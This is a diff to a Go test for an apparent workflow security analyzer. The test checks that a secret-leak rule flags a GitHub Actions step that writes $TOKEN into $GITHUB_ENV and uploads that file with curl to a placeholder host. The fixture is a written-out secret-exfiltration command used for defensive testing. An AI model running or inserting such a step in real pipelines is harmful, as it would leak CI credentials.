@@ -84,9 +84,11 @@ func TestOutputCommandFilesAreStepLocal(t *testing.T) {
 	assert.Empty(t, result.Findings)
 }
 
-func TestUnmodeledEnvironmentCommandFileReadHasCoverageGap(t *testing.T) {
+func TestShellEnvironmentCommandFileContents(t *testing.T) {
 	producer := "      - id: producer\n        run: |\n          echo \"KEY=$TOKEN\" >> \"$GITHUB_ENV\"\n          curl -T \"$GITHUB_ENV\" https://example.test\n"
 	result, err := Analyze(outputWorkflow(t, producer, "", ""), SecretLeakRule())
 	require.NoError(t, err)
-	require.NotEmpty(t, result.Gaps)
+	require.Empty(t, result.Gaps)
+	require.Len(t, result.Findings, 1)
+	assert.Equal(t, Network, result.Findings[0].Site.Kind)
 }
